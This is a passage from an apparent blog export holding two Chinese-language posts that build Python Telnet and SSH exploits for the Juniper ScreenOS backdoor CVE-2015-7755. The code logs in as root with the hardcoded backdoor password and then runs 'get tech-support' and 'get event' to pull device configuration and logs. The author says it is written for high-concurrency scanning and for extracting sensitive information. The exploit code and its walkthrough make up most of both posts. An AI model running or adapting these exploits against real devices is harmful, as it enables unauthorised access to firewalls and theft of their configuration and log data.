<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvbmV3cy9tYWpvci1tZXRhcGFja2FnZS1tYWtlb3Zlci8=">Major Metapackage Makeover<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy9nZW5lcmFsLXVzZS9ub3ZuYy1rYWxpLWluLWJyb3dzZXIv">Kali In The Browser (noVNC)<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vc2V0LXVuc2V0LWVudmlyb25tZW50LXZhcmlhYmxlcy1pbi1saW51eC8=">当 Kali 遇见 Docker<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NkaWh2YWkvYXJ0aWNsZS9kZXRhaWxzLzEwMzgyMjQ5OCNWTkNfMTI=">【备忘录】树莓派安装Kali Linux并安装VNC<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9xaWl0YS5jb20vcm9jaW5hbnRlLWVpbi9pdGVtcy82ODBmMjBkMzdhN2U1MzZkMzA3Yg==">Dockerを使ってKali Linuxの環境を構築した時のメモ<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Mac OS</tag>
        <tag>Security</tag>
        <tag>Tools</tag>
        <tag>Setup</tag>
        <tag>Docker</tag>
        <tag>Kali</tag>
        <tag>Pentest</tag>
        <tag>VNC</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇</title>
    <url>/tech/shell-interaction-in-python-1-telnet/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Shell Interaction in Python #1: Telent</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h3 id="背景">背景</h3>
<p>我们常常需要使用编程语言实现与某些终端交互，以实现交互过程的可控性。具体到这类涉及终端交互的漏洞，只有编写合适的PoC/Exp，并与目标有正确的交互逻辑，才能进行漏洞验证。</p>
<p>这里，我们以Juniper后门漏洞CVE-2015-7755为例，介绍如何使用Python编写Telnet交互程序，且:</p>
<ul>
<li>要求该程序是可以用于高并发扫描的。</li>
<li>实现Exp，获取相关敏感信息。</li>
</ul>
<p>Juniper后门漏洞相关信息可参见<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzkwMzIzLmh0bWw=">Freebuf相关文章<i class="fa fa-external-link-alt"></i></span>。简而言之，即可使用任意用户名及密码 <strong><em>&lt;&lt;&lt; %s(un='%s') = %u</em></strong> 来登录一些Juniper ScreenOS设备的Telnet及SSh服务。</p>
<h3 id="难点">难点</h3>
<h4 id="模块选择">模块选择</h4>
<p>初版PoC程序我使用了相对底层的socket模块来简单实现，用于检测单个目标没有问题，但在高并发扫描的时候效率极低，猜测是I/O阻塞的原因。</p>
<p>转而使用系统库内置模块telnetlib：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3RlbG5ldGxpYi5odG1s">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi90ZWxuZXRsaWIucHk=">源码<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>使用telnet模块后并发扫描的效率就非常高了，CPU及带宽占用率都上去了。简单翻阅telnetlib的源码，发现它是有I/O控制的。</p>
<h4 id="exp">Exp</h4>
<p>Juniper设备使用get命令来获取设备的各类信息，可以使用 <em><strong>get ?</strong></em> 来查看相关命令，其中最重要的是2个：</p>
<ul>
<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
</ul>
<p>但存在一个问题，如上2个命令返回的全部信息总量通常比较大，一般&gt;=40KB，而服务端不是一次性将信息全部输出给客户端的，而是分批输出到管道中的，客户端需要不断地键入回车，来顺序获取各个信息分段。</p>
<p>这就要求程序能不断获取结果信息，并正确判断最后一个分段以适时终止。</p>
<a id="more"></a>
<h3 id="代码">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib <span class="keyword">as</span> tl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">23</span>, timeout=<span class="number">10</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line">        data = <span class="string">'--- more ---'</span></span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        flag = <span class="string">'-&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">'-&gt;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag = telnetConn.read_until(<span class="string">'-&gt;'</span>, timeout=timeout)</span><br><span class="line">        toNum = <span class="number">0</span>  <span class="comment"># the max timeout times</span></span><br><span class="line">        telnetConn.write(cmd)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'- more -'</span> <span class="keyword">in</span> data) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            telnetConn.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = telnetConn.read_until(<span class="string">'- more -'</span>, timeout=timeout)</span><br><span class="line">                ret += data</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    telnetConn = tl.Telnet(host=host, port=port, timeout=timeout)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'login: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'login'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, ret, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">'root'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'password: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span> + <span class="string">'\n'</span>)</span><br><span class="line">    banner = telnetConn.read_some()</span><br><span class="line">    telnetConn.write(<span class="string">'?'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    help = telnetConn.read_until(banner, timeout=timeout)</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
<p>代码说明：</p>
<ul>
<li>5 - 21行：实现了exp函数，用于在执行某个命令cmd，并获取全部的返回信息。其中， <strong>-&gt;</strong> 字符串是juniper的shell输入提示符，我们通过判断它来过滤掉上一次的多余输出。在连续获取结果分段的过程中，若出现超时，则会最多尝试maxTo次。</li>
<li>23 - 42行：主代码逻辑，登陆了远端telnet，并执行了?命令，判断返回的信息中是否包含success_flag变量对应的字符串，默认是'ping other host'，若存在则断定存在该漏洞。若doExp为True，则表示执行Exp，则程序会调用exp()函数分别执行上节中提到2个get命令并获取全部返回信息。 <em><strong>这里需要特别指出的是，返回的techsupport字符串中可能含有各种特殊编码的字符串，因此若需对其进行转码操作请再三考虑，以防改变原始数据</strong></em>。</li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Security</tag>
        <tag>CVE</tag>
        <tag>PoC/Exp</tag>
        <tag>Telnet</tag>
        <tag>Vul</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇</title>
    <url>/tech/shell-interaction-in-python-2-ssh/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Shell Interaction in Python #2: SSH</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h3 id="难点">难点</h3>
<h4 id="模块选择">1. 模块选择</h4>
<p>对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。</p>
<h5 id="paramiko">(1) paramiko</h5>
<p>SSH交互最常用的是第三方模块是paramiko：</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2RvY3MucGFyYW1pa28ub3JnLw==">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3RyZWUvbWFzdGVyL3BhcmFtaWtv">源码<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<p>下面给出使用paramiko进行ssh登录的一个demo:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshLogin</span><span class="params">(host, username, password, port=<span class="number">22</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(</span><br><span class="line">            host,</span><br><span class="line">            username=username,</span><br><span class="line">            password=password,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            compress=<span class="literal">True</span>,</span><br><span class="line">            allow_agent=<span class="literal">False</span>,</span><br><span class="line">            look_for_keys=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.authenticated</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.get_banner()</span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">'ls'</span>, bufsize=<span class="number">1024</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'... '</span> + line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>代码说明：</p>
<ul>
<li>17行：用于判断是否登录成功</li>
<li>18行：用于输出ssh banner，即登录成功后的欢迎字符串，比如我的vps登录成功后有如下欢迎字符串:</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Welcome to Ubuntu <span class="number">14.04</span><span class="number">.3</span> LTS (GNU/Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-68</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:<span class="comment">//help.ubuntu.com/</span></span><br><span class="line">Last login: Wed Dec <span class="number">30</span> <span class="number">01</span>:<span class="number">55</span>:<span class="number">57</span> <span class="number">2015</span> <span class="keyword">from</span> <span class="number">222.222</span><span class="number">.222</span><span class="number">.222</span></span><br><span class="line"><span class="symbol">root@</span>vultr:~# c</span><br></pre></td></tr></table></figure>
<p>使用如上demo函数尝试登录我的vps，成功登录并打印了ls命令的输出。</p>
<p>但是存在如下问题：</p>
<ul>
<li>使用如上sshLogin函数登录juniper设备，代码运行到17行时输出为True，说明成功登录了，但当执行到第19行时，会出现如下错误：</li>
</ul>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/client.py"</span>, <span class="keyword">line</span> 405, <span class="keyword">in</span> exec_command</span><br><span class="line">    chan.exec_command(command)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 60, <span class="keyword">in</span> _check</span><br><span class="line">    <span class="keyword">return</span> func(self, *<span class="keyword">args</span>, **kwds)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 229, <span class="keyword">in</span> exec_command</span><br><span class="line">    self._wait_for_event()</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 1086, <span class="keyword">in</span> _wait_for_event</span><br><span class="line">    raise <span class="keyword">e</span></span><br><span class="line">paramiko.ssh_exception.SSHException: Channel closed.</span><br></pre></td></tr></table></figure>
<p>这会导致SSH连接的中断，导致这种异常的原因，可能是juniper这种设备的SSH实现是非标准的，而paramiko对这些非标准SSH支持不佳所致，而使用Unix/Linux自带的SSH客户端程序登陆这些设备就没有这种问题。看来paramiko并不是完美的解决方案，如果仅仅需要验证是否登陆成功，它还是可以满足的。</p>
<ul>
<li>无论目标是我的vps还是juniper设备，第18行输出的都是空字符串。在google上百度了一下，有人遇到类似问题（<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL2lzc3Vlcy8yNzM=">#1<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3B1bGwvNTg=">#2<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yNTYwOTE1My9wYXJhbWlrby1lcnJvci1yZWFkaW5nLXNzaC1wcm90b2NvbC1iYW5uZXI=">#3<i class="fa fa-external-link-alt"></i></span>），也有人做了解答，但大都还是说调用get_banner()函数，并不是解决办法。猜测这可能是paramiko自身的问题，没有深究，如果您知道原因及解决办法，还请指教。</li>
</ul>
<h5 id="pexpect">(2) pexpect</h5>
<p>从Freebuf文章 <span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzkwODg2Lmh0bWw=">&quot;利用Censys批量获取Juniper Netscreen后门&quot;<i class="fa fa-external-link-alt"></i></span> 中了解到pexpect可以用来实现SSH交互，于是简单了解一番。</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3BleHBlY3QucmVhZHRoZWRvY3Mub3JnLw==">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BleHBlY3QvcGV4cGVjdC90cmVlL21hc3Rlci9wZXhwZWN0">源码<i class="fa fa-external-link-alt"></i></span></li>
<li>相关资料:
<ul>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDEv">探索 Pexpect，第 1 部分：剖析 Pexpect<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">探索 Pexpect，第 2 部分：Pexpect 的实例分析<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
</ul>
<p>Freebuf的文章中提到了编写PoC验证设备是否还存在漏洞的思路：</p>
<blockquote>
<p>其实由于登录后并不是传统的SSH，而是该防火墙的操作终端，因此pxssh会认为并没有登录成功，而是返回超时异常，此时我们检测其返回的before字段如果有Remote Management Console字样就说明该主机存在后门。</p>
</blockquote>
<p>其中提到的pxssh是pexpect中的一个类pexpect.pxssh.pxssh，编写SSH交互程序需要用到它，使用示例参见<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBM的文档<i class="fa fa-external-link-alt"></i></span>。</p>
<p>尝试了一番，pxssh其实是可以登陆成功的，并没有文章中所说的 &quot;返回异常&quot;。</p>
<p>其实pxssh底层实现还是以进程的方式调用Unix/Linux自带的SSH可执行程序的，而正如上面提到的自带的SSH兼容性很强，因此使用pxssh编写PoC是不错的选择。</p>
<p>但若将程序用于高并发扫描，需要权衡一下并发数与机器性能，因为每扫描一个目标就需要运行一个SSH客户端程序进程。</p>
<h4 id="exp">2. Exp</h4>
<p>PoC可以编写了，接下来是Exp，目标还是执行如下2个命令：</p>
<ul>
<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
</ul>
<p>SSH Exp的逻辑与Telnet几乎一样，但是 pexpect.pxssh.pxssh 类中并没有类似于 telnetlib.Telnet 类中的 read_until(expected[, timeout]) 这种函数。</p>
<p>我们可以使用实例函数 pxssh.sendline(cmd) 来发送命令，其中cmd为命令字符串，结尾不必包含，函数会在命令结尾自动添加。</p>
<p>但使用pxssh编写Exp，还是存在如下问题：</p>
<ul>
<li>pxssh默认将上一次命令执行后返回的结果字符串存储在实例变量pxssh.before中，但是在多次获取结果分段时，连续2次获取的消息分段会有重叠。</li>
<li>从源码可以看到pxssh类继承自pexpect.pyt_spawn.spawn类，而spawn类又继承自pexpect.spawnbase.SpawnBase类。在SpawnBase类中，存在类变量buffer，用于接收服务器端发回的消息。因此尝试直接使用pxssh.buffer变量来代替before变量，并在每一次发送新的命令之前，将pxssh.buffer清空，但是又出现了结果不完整的问题。</li>
<li>可以尝试使用<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBM的文章<i class="fa fa-external-link-alt"></i></span>中 &quot;例 3：ssh 的使用&quot; 提到的，直接使用spawn类来实现，但是该类较为底层，需要我们自己处理SSH的登录及交互逻辑，且其中expect函数的pattern参数需为pexpect.expect中定义的类实例，而不是直接传入字符串或正则表达式，使用起来较为繁琐。</li>
</ul>
<p>最终找到了合适的类函数 pexpect.pty_spawn.read_nonblocking(size=1, timeout=-1) ，它读取服务器端发来的数据，直到数据字节数达到size，或者达到超时时间timeout。但终止字符串就还需由我们自己判断。</p>
<h3 id="代码">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="literal">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="literal">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
<p>代码说明：</p>
<ul>
<li>26行：连续发送多个，一次性将服务器端的多个结果分段获取到客户端的接收缓存中，这样可以减少交互，提高程序效率。</li>
<li>29行：判断每次读取的缓存区中的数据的后10个字符串中是否存在 <strong>-&gt;</strong> 字符，来识别最后一个结果分段。</li>
</ul>
<p>代码逻辑与Telnet程序类似。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Security</tag>
        <tag>CVE</tag>
        <tag>PoC/Exp</tag>
        <tag>Vul</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
</search>
